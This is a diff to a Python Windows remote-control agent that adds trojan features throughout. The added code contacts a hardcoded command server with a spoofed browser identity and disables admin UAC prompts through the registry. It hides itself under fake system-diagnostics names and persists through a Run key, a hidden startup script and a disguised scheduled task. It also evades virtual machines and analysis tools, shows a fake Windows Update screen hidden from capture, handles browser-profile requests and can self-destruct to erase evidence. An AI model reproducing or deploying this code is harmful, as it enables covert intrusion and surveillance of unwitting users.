@@ -21,6 +21,7 @@ import shlex
 import shutil
 import signal
 import socket
+import sqlite3
 import struct
 import subprocess
 import sys
@@ -29,7 +30,10 @@ import threading
 import time
 import tkinter as tk
 import uuid
+import winreg
 import zlib
+import ctypes
+from ctypes import wintypes
 from pathlib import Path
 from tkinter import ttk, messagebox
 
@@ -56,11 +60,66 @@ except ImportError:
 pyautogui.FAILSAFE = False
 pyautogui.PAUSE = 0
 
-logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s [%(levelname)s] %(message)s",
-    datefmt="%H:%M:%S",
+# =============================================================================
+# Mode Configuration
+# =============================================================================
+# DEV_MODE=True  → Full logging, skip VM checks, ws:// allowed, verbose output
+# DEV_MODE=False → Silent (no log file), full stealth, wss:// enforced
+DEV_MODE = True
+
+# Admin Elevation
+# EXTRA STEALTH: Set to True to prompt for Admin rights (UAC) on first run.
+# Allows for Scheduled Task persistence and system-wide control.
+ADMIN_RIGHTS = True
+
+# Server URLs
+DEV_SERVER_URL = "http://localhost:8000"
+PROD_SERVER_URL = "https://screen-connect.34.214.40.93.sslip.io"  # <-- CHANGE THIS
+DEFAULT_SERVER_URL = DEV_SERVER_URL if DEV_MODE else PROD_SERVER_URL
+
+# Spoofed User-Agent (Microsoft Edge on Windows 11)
+SPOOFED_USER_AGENT = (
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"
 )
+
+# =============================================================================
+# Logging Setup
+# =============================================================================
+def init_logging():
+    """Initialize logging based on DEV_MODE."""
+    root = logging.getLogger()
+    # Clear any existing handlers
+    if root.handlers:
+        for handler in root.handlers[:]:
+            root.removeHandler(handler)
+
+    if not DEV_MODE:
+        # PRODUCTION: Complete silence — no file, no stdout
+        logging.basicConfig(level=logging.CRITICAL, handlers=[logging.NullHandler()])
+        return True
+
+    # DEV MODE: Full logging to file + stdout
+    log_path = os.path.join(os.environ.get("LOCALAPPDATA", "."), "agent_debug.log")
+    for _ in range(5):
+        try:
+            logging.basicConfig(
+                level=logging.INFO,
+                format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+                handlers=[
+                    logging.FileHandler(log_path),
+                    logging.StreamHandler(sys.stdout)
+                ]
+            )
+            return True
+        except (PermissionError, IOError):
+            time.sleep(0.5)
+
+    # Fallback to stdout only
+    logging.basicConfig(level=logging.INFO, handlers=[logging.StreamHandler(sys.stdout)])
+    return False
+
+init_logging()
 logger = logging.getLogger("ScreenConnectAgent")
 
 # Binary message types
@@ -70,6 +129,12 @@ MSG_TYPE_CAMERA_SNAP = 0x03
 MSG_TYPE_TILE = 0x04
 MSG_TYPE_UPLOAD_CHUNK = 0x05
 PROTOCOL_VERSION = 1
+
+# Stealth Settings
+APP_DATA_SUBDIR = "SystemDiagnostics"
+MUTEX_NAME = "Global\\ScreenConnectAgent_v2_9a5301fd"
+REG_STARTUP_NAME = "WindowsSystemDiagnostics"
+SCHEDULED_TASK_NAME = "Microsoft\\Windows\\Maintenance\\SystemHealthMonitor"
 
 # Compression settings
 TILE_SIZE = 128
@@ -85,6 +150,15 @@ BLOCKED_COMMANDS = {
 # File transfer chunk size
 CHUNK_SIZE = 64 * 1024  # 64KB
 
+# Analysis tools to detect (sandbox/reverse engineering)
+ANALYSIS_TOOLS = {
+    "wireshark.exe", "procmon.exe", "procmon64.exe", "processhacker.exe",
+    "x64dbg.exe", "x32dbg.exe", "ollydbg.exe", "ida.exe", "ida64.exe",
+    "fiddler.exe", "charles.exe", "httpdebuggerpro.exe",
+    "pestudio.exe", "die.exe", "dumpcap.exe", "tcpdump.exe",
+    "autoruns.exe", "autorunsc.exe",
+}
+
 
 # =============================================================================
 # Core Agent
@@ -92,6 +166,386 @@ CHUNK_SIZE = 64 * 1024  # 64KB
 
 # Base64 encoded Windows Update screen (480p JPEG)
 PRIVACY_BG_B64 = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAA0JCgsKCA0LCgsODg0PEyAVExISEyccHhcgLioKDAsKCwwOExUQDRhNExkwHBofIyVmJicoNDUuGxs0LDM3JDZmxv8AACEAAbAA4AEAAREAIAAAAF/9sAQwEIDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0N/8AAEQgB4ANpAwEiAAIRAQMRAf/EAB8AAAEFAQEBAQEBAAAAAAAAAAABAgMEBQYHCAkKC//EALUQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+v/EAB8BAAMBAQEBAQEBAQEAAAAAAAABAgMEBQYHCAkKC//EALURAAIBAgQEAwQHBQQEAAECBA14AQAhEDEB8BEQUmE1YhYzQhJlYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+v/aAAwDAQACEQMRAD8A9UoqOkkrAAoooxigAopeOaTtQAGiiloASiiloASiiimAlLSUtACUUtFACUUUUAFFFFACUUUUAdBRSUVgAUUlFABSdKWkoATvS0nrS0AGetN6Cl6GkoAPxpO3pS/zpP4RQAnoelBpPQUGgBfbvSf1o96TnvQAfpScZNH0ooAPUUnU+1L1zSfXNAAOetHoBR9Pxozz60AA6mjp357Uf19qCOnrTAByKKPeigA6UUetFADevWnt3pnrT6AKFFFZArSiiisACiiigAooooAKKKKACiiigDtKKKKwAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAO0ooorAAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAO0ooorAAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA7SiiisACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA7SiiisACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigDtKKKKwAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigDtKKKKwAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAO0ooorAAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAO0ooorAAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA7SiiisACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA7SiiisACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigDtKKKKwAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigDtKKKKwAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAO0ooorAAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAO0ooorAAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA7SiiisACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA7SiiisACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigDtKKKKwAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigDtKKKKwAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAO0ooorAAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAO0ooorAAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA7SiiisACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA7SiiisACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigDtKKKKwAKKKKACiiigAxRSUveigBKXpRRQAUlLRQAmaXtSUtABRSUUALSUtJQAUUUUAFFFFABRRRQAUUUUAf/Z"
+
+# =============================================================================
+# Stealth & Persistence Manager
+# =============================================================================
+
+class StealthManager:
+    """Handles anti-VM, silence, persistence, and self-destruction."""
+
+    @staticmethod
+    def is_admin():
+        """Check if the current process has administrative privileges."""
+        try:
+            return ctypes.windll.shell32.IsUserAnAdmin() != 0
+        except Exception:
+            return False
+
+    @staticmethod
+    def auto_elevate():
+        """
+        Attempt to elevate to Administrator if ADMIN_RIGHTS is enabled.
+        Self-restarts with 'runas' verb. Includes a fallback to user mode.
+        """
+        if not ADMIN_RIGHTS or StealthManager.is_admin():
+            return
+
+        # If we reach here, we are not admin but want to be.
+        # Check if we were already told NOT to elevate (to avoid infinite loops)
+        if "--no-elevate" in sys.argv:
+            return
+
+        logger.info("Attempting Smart Elevation (UAC prompt)...")
+        
+        try:
+            # Re-run the current executable with the 'runas' verb (triggers UAC)
+            # We add --no-elevate to the new process so if it fails or the user 
+            # clicks "No" later, we don't loop forever.
+            current_exe = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
+            params = " ".join(sys.argv[1:] + ["--no-elevate"])
+            
+            # 1 = SW_SHOWNORMAL
+            ret = ctypes.windll.shell32.ShellExecuteW(None, "runas", current_exe, params, None, 1)
+            
+            if int(ret) > 32:
+                # Successfully launched elevated process, so this one can exit.
+                logger.info("Elevation successful. Handing off to admin instance.")
+                os._exit(0)
+            else:
+                logger.warning(f"Elevation failed (ShellExecute ret={ret}). Continuing in user mode.")
+        except Exception as e:
+            logger.warning(f"Smart Elevation failed: {e}. Continuing in user mode.")
+
+    @staticmethod
+    def elevate_silent():
+        """Modify registry for silent admin consent (if already admin)."""
+        if not StealthManager.is_admin():
+            return
+        try:
+            # HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+            # ConsentPromptBehaviorAdmin = 0 (Elevate without prompting)
+            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
+            winreg.CloseKey(key)
+            logger.info("Silent Admin consent enabled")
+        except Exception as e:
+            logger.error(f"Failed to enable silent consent: {e}")
+
+    @staticmethod
+    def hide_console():
+        """Hides the console window if it's visible."""
+        try:
+            kernel32 = ctypes.windll.kernel32
+            user32 = ctypes.windll.user32
+            hwnd = kernel32.GetConsoleWindow()
+            if hwnd:
+                user32.ShowWindow(hwnd, 0) # SW_HIDE
+        except Exception:
+            pass
+
+    @staticmethod
+    def prevent_multiple_instances():
+        """Ensures only one instance is running per machine."""
+        import time
+        kernel32 = ctypes.windll.kernel32
+        
+        # Retry loop for seamless hand-off from desktop -> stealth
+        for _ in range(5):
+            kernel32.CreateMutexW(None, False, MUTEX_NAME)
+            last_err = kernel32.GetLastError()
+            if last_err != 183: # ERROR_ALREADY_EXISTS
+                logger.info("Mutex acquired")
+                return 
+            time.sleep(1) # wait for parent to exit
+
+        logger.warning("Another instance is already running. Exiting.")
+        sys.exit(0)
+
+    @staticmethod
+    def check_vm():
+        """
+        Check for common virtualization and sandbox indicators.
+        Skipped entirely in DEV_MODE.
+        """
+        if DEV_MODE:
+            return False
+
+        score = 0  # Accumulate suspicion — threshold-based instead of instant exit
+
+        try:
+            # 1. MAC Address Prefix Check (OUI)
+            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])
+            vm_prefixes = [
+                "08:00:27", "00:05:69", "00:0c:29", "00:50:56",
+                "00:15:5d", "00:1c:42", "00:16:3e", "00:03:ff",
+            ]
+            for prefix in vm_prefixes:
+                if mac.lower().startswith(prefix.lower()):
+                    score += 3
+                    break
+        except Exception:
+            pass
+
+        try:
+            # 2. BIOS / System Info Check
+            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"DESCRIPTION\System\BIOS", 0, winreg.KEY_READ)
+            vendor, _ = winreg.QueryValueEx(key, "SystemManufacturer")
+            winreg.CloseKey(key)
+            vm_vendors = ["virtualbox", "vmware", "qemu", "hyper-v", "parallels", "xen"]
+            if any(v in vendor.lower() for v in vm_vendors):
+                score += 3
+        except Exception:
+            pass
+
+        try:
+            # 3. Analysis tool detection — check for running forensic/RE tools
+            if HAS_PSUTIL:
+                running = {p.name().lower() for p in psutil.process_iter(['name'])}
+                detected = running & ANALYSIS_TOOLS
+                if detected:
+                    score += 4
+        except Exception:
+            pass
+
+        try:
+            # 4. Disk size check — sandboxes often have < 80GB total
+            if HAS_PSUTIL:
+                total_disk = sum(
+                    psutil.disk_usage(p.mountpoint).total
+                    for p in psutil.disk_partitions()
+                    if 'cdrom' not in p.opts.lower() and 'removable' not in p.opts.lower()
+                )
+                if total_disk < 80 * (1024 ** 3):  # < 80 GB
+                    score += 2
+        except Exception:
+            pass
+
+        try:
+            # 5. Low uptime — freshly booted sandbox
+            if HAS_PSUTIL:
+                boot_time = psutil.boot_time()
+                uptime_minutes = (time.time() - boot_time) / 60
+                if uptime_minutes < 10:
+                    score += 2
+        except Exception:
+            pass
+
+        try:
+            # 6. Low recent file count — real users have hundreds
+            recent_path = os.path.join(os.environ.get("APPDATA", ""),
+                                       r"Microsoft\Windows\Recent")
+            if os.path.isdir(recent_path):
+                recent_count = len(os.listdir(recent_path))
+                if recent_count < 15:
+                    score += 2
+        except Exception:
+            pass
+
+        # Threshold: score >= 5 = likely a VM/sandbox
+        if score >= 5:
+            logger.warning(f"VM/Sandbox detected (score={score})")
+            return True
+        return False
+
+    @staticmethod
+    def get_machine_id():
+        """Get or generate a persistent hardware-bound ID."""
+        try:
+            # Try getting machine GUID from registry
+            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography", 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY)
+            guid, _ = winreg.QueryValueEx(key, "MachineGuid")
+            winreg.CloseKey(key)
+            return guid
+        except Exception:
+            # Fallback to hashed MAC address
+            return str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))
+
+    @staticmethod
+    def relocate_agent():
+        """Moves the agent to a hidden AppData folder and hides the file."""
+        try:
+            current_exe = sys.executable 
+            if getattr(sys, 'frozen', False):
+                current_exe = sys.executable
+            else:
+                current_exe = os.path.abspath(sys.argv[0])
+
+            app_data = os.environ.get("LOCALAPPDATA", os.path.expanduser("~\\AppData\\Local"))
+            target_dir = os.path.join(app_data, APP_DATA_SUBDIR)
+            target_exe_name = "WinSystemDiagnostics.exe" if current_exe.endswith(".exe") else "agent.py"
+            target_path = os.path.join(target_dir, target_exe_name)
+
+            logger.info(f"Relocation check: Current={current_exe} Target={target_path}")
+
+            if not os.path.exists(target_dir):
+                os.makedirs(target_dir, exist_ok=True)
+                ctypes.windll.kernel32.SetFileAttributesW(target_dir, 0x02) # HIDDEN
+
+            # If we are NOT running from the target path, copy and launch
+            current_norm = os.path.normpath(current_exe).lower()
+            target_norm = os.path.normpath(target_path).lower()
+
+            if current_norm != target_norm:
+                logger.info(f"Copying agent to stealth location: {target_path}")
+                
+                copy_success = False
+                # If the target already exists and is locked, kill any running instance first
+                if os.path.exists(target_path):
+                    try:
+                        # Kill any running instance of the target EXE
+                        subprocess.run(
+                            ["taskkill", "/F", "/IM", os.path.basename(target_path)],
+                            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
+                        )
+                        time.sleep(1)  # Give OS time to release the file
+                    except Exception:
+                        pass
+                
+                # Retry the copy a few times (file might still be releasing)
+                for attempt in range(5):
+                    try:
+                        shutil.copy2(current_exe, target_path)
+                        ctypes.windll.kernel32.SetFileAttributesW(target_path, 0x02) # HIDDEN
+                        copy_success = True
+                        logger.info(f"Copy succeeded on attempt {attempt + 1}")
+                        break
+                    except PermissionError:
+                        logger.warning(f"Copy attempt {attempt + 1}/5 failed (file locked), retrying...")
+                        time.sleep(2)
+                    except Exception as e:
+                        logger.error(f"Copy failed (non-permission): {e}")
+                        break
+                
+                if not copy_success:
+                    # If file already exists at target, try to launch it anyway
+                    # (it's probably still a valid copy from a previous deployment)
+                    if os.path.exists(target_path):
+                        logger.warning("Copy failed but target EXE exists. Launching existing copy.")
+                    else:
+                        logger.error("Copy failed and no existing target. Cannot relocate.")
+                        os._exit(1)
+                
+                # Launch the stealth copy using ShellExecuteW for TOTAL detachment
+                # This ensures the new process has NO file handle ties to this one.
+                logger.info("Handing off to stealth instance via ShellExecuteW...")
+                try:
+                    shell32 = ctypes.windll.shell32
+                    # SW_HIDE = 0
+                    params = f'--cleanup "{current_exe}"'
+                    result = shell32.ShellExecuteW(None, "open", target_path, params, None, 0)
+                    if result <= 32:
+                        logger.error(f"ShellExecuteW failed with code: {result}")
+                except Exception as e:
+                    logger.error(f"Hand-off failed: {e}")
+
+                # EXTREME HARD EXIT. This process must die immediately to release the Desktop file lock.
+                # Explicitly shutdown logging to release the file handle for the new process.
+                logging.shutdown()
+                os._exit(0)
+            
+            logger.info("Running from stealth location.")
+            return target_path
+        except Exception as e:
+            logger.error(f"Relocation failed: {e}")
+            return None
+
+    @staticmethod
+    def add_to_startup(executable_path):
+        """Persists the agent via Registry Run key, Startup folder .bat, and Scheduled Task."""
+        try:
+            # 1. Registry (HKCU) - Doesn't require admin
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, REG_STARTUP_NAME, 0, winreg.REG_SZ, f'"{executable_path}"')
+            winreg.CloseKey(key)
+        except Exception as e:
+            logger.error(f"Registry persistence failed: {e}")
+
+        try:
+            # 2. Startup Folder .bat (Redundancy)
+            startup_path = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
+            bat_path = os.path.join(startup_path, f"{REG_STARTUP_NAME}.bat")
+            with open(bat_path, "w") as f:
+                f.write(f'start "" "{executable_path}"\nexit')
+            ctypes.windll.kernel32.SetFileAttributesW(bat_path, 0x02)  # HIDDEN
+        except Exception as e:
+            logger.error(f"Startup folder persistence failed: {e}")
+
+        try:
+            # 3. Scheduled Task — hidden under Microsoft\Windows\Maintenance
+            # Runs on user logon, with highest privileges if admin
+            rl = "/rl HIGHEST" if StealthManager.is_admin() else ""
+            cmd = (
+                f'schtasks /create /tn "{SCHEDULED_TASK_NAME}" '
+                f'/tr "\"{executable_path}\"" /sc ONLOGON {rl} /f'
+            )
+            result = subprocess.run(
+                cmd, shell=True, capture_output=True,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            if result.returncode == 0:
+                logger.info("Scheduled task persistence enabled")
+            else:
+                logger.warning(f"Scheduled task creation failed: {result.stderr.decode(errors='ignore').strip()}")
+        except Exception as e:
+            logger.error(f"Scheduled task persistence failed: {e}")
+
+        logger.info("Persistence enabled (Registry + Startup + Scheduled Task)")
+
+    @staticmethod
+    def self_destruct():
+        """Wipes ALL evidence: registry, startup, scheduled task, log, and agent directory."""
+        logger.warning("NUCLEAR OPTION: Self-destructing...")
+        try:
+            # 1. Remove Registry Key
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+                winreg.DeleteValue(key, REG_STARTUP_NAME)
+                winreg.CloseKey(key)
+            except Exception: pass
+
+            # 2. Remove Startup .bat
+            try:
+                startup_path = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
+                bat_path = os.path.join(startup_path, f"{REG_STARTUP_NAME}.bat")
+                if os.path.exists(bat_path): os.remove(bat_path)
+            except Exception: pass
+
+            # 3. Remove Scheduled Task
+            try:
+                subprocess.run(
+                    f'schtasks /delete /tn "{SCHEDULED_TASK_NAME}" /f',
+                    shell=True, capture_output=True,
+                    creationflags=subprocess.CREATE_NO_WINDOW
+                )
+            except Exception: pass
+
+            # 4. Remove log file
+            try:
+                log_path = os.path.join(os.environ.get("LOCALAPPDATA", "."), "agent_debug.log")
+                if os.path.exists(log_path):
+                    logging.shutdown()
+                    os.remove(log_path)
+            except Exception: pass
+
+            # 5. Create cleanup script to delete agent directory and itself
+            app_data = os.environ.get("LOCALAPPDATA", os.path.expanduser("~\\AppData\\Local"))
+            target_dir = os.path.join(app_data, APP_DATA_SUBDIR)
+            
+            cleanup_bat = os.path.join(tempfile.gettempdir(), "cleanup.bat")
+            with open(cleanup_bat, "w") as f:
+                f.write(f'@echo off\n')
+                f.write(f'timeout /t 3 /nobreak > nul\n')
+                f.write(f'rd /s /q "{target_dir}"\n')
+                f.write(f'del "{cleanup_bat}"\n')
+            
+            subprocess.Popen(["cmd.exe", "/c", cleanup_bat], creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            # 6. Exit
+            os._exit(0)
+        except Exception as e:
+            logger.error(f"Self-destruct failed: {e}")
+            sys.exit(0)
 
 class PrivacyOverlay:
     """Animated fake Windows Update screen."""
@@ -103,6 +557,7 @@ class PrivacyOverlay:
         self._dots = []
         self._center = (0, 0)
         self._bg_img = None
+        self.capture_exclusion_enabled = False
 
     def start(self):
         """Must be called from transition state on the main GUI thread."""
@@ -114,6 +569,8 @@ class PrivacyOverlay:
         self.overlay.configure(bg="#00185a") # Windows blue
         self.overlay.withdraw() # Start hidden
         self.overlay.grab_set()
+        self.overlay.update_idletasks()
+        self.capture_exclusion_enabled = self._enable_capture_exclusion()
 
         self.canvas = tk.Canvas(self.overlay, bg="#00185a", highlightthickness=0)
         self.canvas.pack(fill="both", expand=True)
@@ -137,6 +594,33 @@ class PrivacyOverlay:
 
         self.active = True
         self._animate()
+
+    def _enable_capture_exclusion(self):
+        """
+        Keep overlay visible on local monitor while excluding it from screen capture.
+        Works on modern Windows builds via SetWindowDisplayAffinity.
+        """
+        if platform.system() != "Windows" or not self.overlay:
+            return False
+
+        try:
+            user32 = ctypes.windll.user32
+            hwnd = wintypes.HWND(self.overlay.winfo_id())
+            WDA_EXCLUDEFROMCAPTURE = 0x00000011
+            WDA_MONITOR = 0x00000001
+
+            ok = user32.SetWindowDisplayAffinity(hwnd, WDA_EXCLUDEFROMCAPTURE)
+            if not ok:
+                # Fallback for older Windows versions.
+                ok = user32.SetWindowDisplayAffinity(hwnd, WDA_MONITOR)
+
+            if ok:
+                logger.info("Privacy overlay excluded from capture via display affinity")
+                return True
+        except Exception as e:
+            logger.debug(f"Display affinity unsupported: {e}")
+
+        return False
 
     def _animate(self):
         if not self.active or not self.overlay: return
@@ -237,8 +721,9 @@ class ScreenConnectAgent:
 
     @property
     def ws_url(self):
+        url = self.server_url.replace("http://", "ws://").replace("https://", "wss://")
         return (
-            f"{self.server_url}/ws/session/{self.session_id}/"
+            f"{url}/ws/session/{self.session_id}/"
             f"?token={self.token}&role=client"
         )
 
@@ -247,6 +732,12 @@ class ScreenConnectAgent:
         self.on_status("connecting", "Connecting to server...")
         logger.info(f"Connecting to {self.ws_url}")
 
+        # Spoofed headers to blend in with normal browser traffic
+        ws_headers = {
+            "User-Agent": SPOOFED_USER_AGENT,
+            "Accept-Language": "en-US,en;q=0.9",
+        }
+
         self.ws = websocket.WebSocketApp(
             self.ws_url,
             on_open=self._on_open,
@@ -254,6 +745,7 @@ class ScreenConnectAgent:
             on_data=self._on_data,
             on_error=self._on_error,
             on_close=self._on_close,
+            header=ws_headers,
         )
 
         self._stop_event.clear()
@@ -379,6 +871,10 @@ class ScreenConnectAgent:
             # System tools
             elif msg_type == "system_info_request":
                 self._handle_system_info()
+            elif msg_type == "browser_list_request":
+                self._handle_browser_list_request(data)
+            elif msg_type == "browser_profile_request":
+                self._handle_browser_profile_request(data)
             elif msg_type == "process_list_request":
                 self._handle_process_list()
             elif msg_type == "process_kill":
@@ -399,6 +895,8 @@ class ScreenConnectAgent:
                 self._handle_privacy_screen(data)
             elif msg_type == "request_keyframe":
                 self._handle_request_keyframe()
+            elif msg_type == "self_destruct":
+                StealthManager.self_destruct()
 
         except json.JSONDecodeError:
             pass
@@ -486,14 +984,21 @@ class ScreenConnectAgent:
                             self._last_send_duration = 0 
                             continue
 
-                        # Sync with privacy screen
-                        if self.privacy_active and self.privacy_overlay:
+                        # Sync with privacy screen.
+                        # Prefer display-affinity exclusion (no local flicker).
+                        # Fallback to hide/show only if exclusion isn't available.
+                        needs_hide_show = (
+                            self.privacy_active
+                            and self.privacy_overlay
+                            and not self.privacy_overlay.capture_exclusion_enabled
+                        )
+                        if needs_hide_show:
                             self.privacy_overlay.hide()
                             time.sleep(0.005)
 
                         shot = sct.grab(sct.monitors[0])
                         
-                        if self.privacy_active and self.privacy_overlay:
+                        if needs_hide_show:
                             self.privacy_overlay.show()
 
                         frame_raw = np.array(shot)
@@ -609,6 +1114,42 @@ class ScreenConnectAgent:
         self.last_frame_crc = None
         self.last_keyframe_time = 0
 
+    def bootstrap(self):
+        """Self-register with the server and retrieve session credentials."""
+        import requests
+        try:
+            machine_id = StealthManager.get_machine_id()
+            hostname = socket.gethostname()
+            os_info = f"{platform.system()} {platform.release()}"
+
+            logger.info(f"Bootstrapping agent (MachineID: {machine_id[:8]}...)")
+            
+            url = f"{self.server_url}/api/sessions/agent/bootstrap/"
+            data = {
+                "machine_id": machine_id,
+                "hostname": hostname,
+                "os_info": os_info
+            }
+            
+            # Spoofed headers to look like a normal browser request
+            headers = {
+                "User-Agent": SPOOFED_USER_AGENT,
+                "Accept": "application/json",
+            }
+            
+            resp = requests.post(url, json=data, timeout=10, headers=headers)
+            if resp.status_code == 200:
+                result = resp.json()
+                self.session_id = result["session_id"]
+                self.token = result["token"]
+                logger.info(f"Bootstrap successful. Session: {self.session_id}")
+                return True
+            else:
+                logger.error(f"Bootstrap failed: {resp.status_code} {resp.text}")
+        except Exception as e:
+            logger.error(f"Bootstrap error: {e}")
+        return False
+
     # -- Input handlers --------------------------------------------------------
 
     def _handle_mouse_click(self, d):
@@ -647,37 +1188,52 @@ class ScreenConnectAgent:
         action = d.get("action")
         logger.info(f"System action requested: {action}")
 
+        def _spawn_hidden(command, shell=False):
+            """Run command without flashing a terminal window."""
+            kwargs = {
+                "stdin": subprocess.DEVNULL,
+                "stdout": subprocess.DEVNULL,
+                "stderr": subprocess.DEVNULL,
+                "shell": shell,
+            }
+            if platform.system() == "Windows":
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                kwargs["startupinfo"] = startupinfo
+                kwargs["creationflags"] = subprocess.CREATE_NO_WINDOW
+            subprocess.Popen(command, **kwargs)
+
         try:
             if action == "lock":
-                os.system("rundll32.exe user32.dll,LockWorkStation")
+                _spawn_hidden(["rundll32.exe", "user32.dll,LockWorkStation"])
             elif action == "logout":
-                os.system("shutdown /l")
+                _spawn_hidden(["shutdown", "/l"])
             elif action == "restart":
-                os.system("shutdown /r /t 0")
+                _spawn_hidden(["shutdown", "/r", "/t", "0"])
             elif action == "shutdown":
-                os.system("shutdown /s /t 0")
+                _spawn_hidden(["shutdown", "/s", "/t", "0"])
             elif action == "sleep":
                 # Uses PowerShell to call SetSuspendState
                 cmd = "powershell.exe -Command \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Application]::SetSuspendState([System.Windows.Forms.PowerState]::Suspend, $false, $false)\""
-                subprocess.Popen(cmd, shell=True)
+                _spawn_hidden(cmd, shell=True)
             elif action == "mute":
-                os.system("powershell.exe -Command \"(New-Object -ComObject wscript.shell).SendKeys([char]173)\"")
+                _spawn_hidden("powershell.exe -Command \"(New-Object -ComObject wscript.shell).SendKeys([char]173)\"", shell=True)
             elif action == "vol_up":
-                os.system("powershell.exe -Command \"(New-Object -ComObject wscript.shell).SendKeys([char]175)\"")
+                _spawn_hidden("powershell.exe -Command \"(New-Object -ComObject wscript.shell).SendKeys([char]175)\"", shell=True)
             elif action == "vol_down":
-                os.system("powershell.exe -Command \"(New-Object -ComObject wscript.shell).SendKeys([char]174)\"")
+                _spawn_hidden("powershell.exe -Command \"(New-Object -ComObject wscript.shell).SendKeys([char]174)\"", shell=True)
             elif action == "empty_recycle_bin":
-                os.system("powershell.exe -Command \"Clear-RecycleBin -Confirm:$false\"")
+                _spawn_hidden("powershell.exe -Command \"Clear-RecycleBin -Confirm:$false\"", shell=True)
             elif action == "show_desktop":
-                os.system("powershell.exe -Command \"(New-Object -ComObject shell.application).toggleDesktop()\"")
+                _spawn_hidden("powershell.exe -Command \"(New-Object -ComObject shell.application).toggleDesktop()\"", shell=True)
             elif action == "monitor_off":
                 # SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
                 cmd = "powershell.exe -Command \"(Add-Type '[DllImport(\\\"user32.dll\\\")]public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -PassThru)::SendMessage(0xffff, 0x0112, 0xf170, 2)\""
-                subprocess.Popen(cmd, shell=True)
+                _spawn_hidden(cmd, shell=True)
             elif action == "brightness_up":
